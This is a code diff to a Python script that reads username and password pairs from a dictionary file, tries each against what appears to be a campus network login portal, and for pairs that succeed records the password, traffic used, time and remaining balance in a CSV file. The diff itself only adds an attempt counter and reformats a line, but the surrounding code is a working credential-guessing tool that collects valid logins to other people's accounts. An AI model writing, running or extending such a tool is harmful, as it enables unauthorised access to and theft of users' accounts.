@@ -11,6 +11,7 @@ requests.adapters.DEFAULT_RETRIES = 5
 # this global variable is used to avoid SSL cert verify fail when fiddler is used
 fiddler_ssl = False
 
+
 def is_success(html_res):
     class HtmlPar(HTMLParser):
         flg_title = False
@@ -207,9 +208,11 @@ if __name__ == '__main__':
     f_out.write('name,pass,used_data,total,used_time,remain_money\n')
     u_name = f_dic.readline().strip('\n')
     u_pass = f_dic.readline().strip('\n')
+    count = 0
     while u_name != "" and u_pass != "":
+        count += 1
         # try the pair
-        print("Trying", u_name, "with password", u_pass, end='')
+        print(count, " - Trying", u_name, "with password", u_pass, end='')
         html_values = {
             'DDDDD': u_name,
             'upass': u_pass,
@@ -239,7 +242,8 @@ if __name__ == '__main__':
             check_code, html_cookie = get_check_code(s)
             # print(check_code, html_cookie)
             u_total = get_total_traffic(check_code, u_name, u_pass, html_cookie, s)
-            f_out.write(u_name + ',' + u_pass + ',' + u_used_data + ',' + u_total + ',' + u_used_time + ',' + u_remain_money + '\n')
+            f_out.write(
+                u_name + ',' + u_pass + ',' + u_used_data + ',' + u_total + ',' + u_used_time + ',' + u_remain_money + '\n')
             log_out(html_cookie, s)
         else:
             print("\tFailed.")
